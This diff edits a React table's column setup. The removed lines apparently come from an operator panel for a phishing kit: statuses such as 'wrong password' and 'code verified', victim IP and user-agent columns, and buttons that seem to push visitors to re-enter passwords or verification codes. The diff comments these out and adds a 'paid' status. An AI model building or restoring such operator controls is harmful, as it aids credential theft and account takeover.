@@ -50,34 +50,34 @@ export const collectionColumn = [
     accessor: "status",
     width: "auto",
     Cell: ({ value }) => {
-      const statusVal = value || "pending";
+      const statusVal = value;
       let bg = "bg-yellow-100 text-yellow-800 border border-yellow-200";
-      if (statusVal === "successful" || statusVal === "success") {
+      let label = "pending";
+
+      if (statusVal === true || statusVal === "true") {
         bg = "bg-green-100 text-green-800 border border-green-200";
-      } else if (statusVal === "wrong password" || statusVal === "pass-wrong") {
-        bg = "bg-red-100 text-red-800 border border-red-200";
-      } else if (statusVal === "code verified" || statusVal === "code-verify") {
-        bg = "bg-blue-100 text-blue-800 border border-blue-200";
+        label = "paid";
       }
+
       return (
         <span className={`px-2 py-0.5 rounded-full text-xs font-semibold uppercase tracking-wider ${bg}`}>
-          {statusVal}
+          {label}
         </span>
       );
     }
   },
-  {
-    Header: "Ip",
-    accessor: "ip",
-    width: "auto",
-  },
+  // {
+  //   Header: "Ip",
+  //   accessor: "ip",
+  //   width: "auto",
+  // },
 
-  {
-    Header: "Agent",
-    accessor: "agent",
-    // width: "auto",
-    minWidth: 500,
-  },
+  // {
+  //   Header: "Agent",
+  //   accessor: "agent",
+  //   // width: "auto",
+  //   minWidth: 500,
+  // },
   {
     Header: "Time",
     accessor: "createdAt",
@@ -90,19 +90,19 @@ export const collectionColumn = [
       </div>
     ),
   },
-  {
-    Header: "Option",
-    accessor: "_id",
-    disableSortBy: true,
-    width: 200,
-    Cell: ({ row }) => (
-      <div className="flex flex-col justify-center items-center gap-2">
-       <WrongPass id={row.original._id} />
-        <VerifyCode id={row.original._id} />
-        <ReVerifyCode id={row.original._id} />
-        <SuccessfulPage id={row.original._id} />
-  <DeleteCollection collectionInfo={row.original}  />
-      </div>
-    ),
-  },
+  // {
+  //   Header: "Option",
+  //   accessor: "_id",
+  //   disableSortBy: true,
+  //   width: 200,
+  //   Cell: ({ row }) => (
+  //     <div className="flex flex-col justify-center items-center gap-2">
+  //      <WrongPass id={row.original._id} />
+  //       <VerifyCode id={row.original._id} />
+  //       <ReVerifyCode id={row.original._id} />
+  //       <SuccessfulPage id={row.original._id} />
+  // <DeleteCollection collectionInfo={row.original}  />
+  //     </div>
+  //   ),
+  // },
 ];
